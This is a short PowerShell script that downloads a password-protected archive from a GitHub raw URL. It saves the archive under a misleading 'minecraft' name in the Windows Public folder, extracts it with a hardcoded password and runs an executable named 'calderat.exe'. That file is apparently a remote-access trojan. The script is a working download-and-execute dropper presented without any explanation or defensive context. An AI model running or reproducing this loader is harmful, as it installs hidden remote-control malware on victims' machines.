$url ='https://github.com/papcaii2004/bin/raw/refs/heads/main/calderat.rar'
$output = 'C:\Users\Public\minecraft.rar'
Invoke-WebRequest -Uri $url -OutFile $output
&"C:\Program Files\WinRAR\rar.exe" x -p"seabank123" C:\Users\Public\minecraft.rar C:\Users\Public\minecraft\
cd C:\Users\Public\minecraft\
.\calderat.exe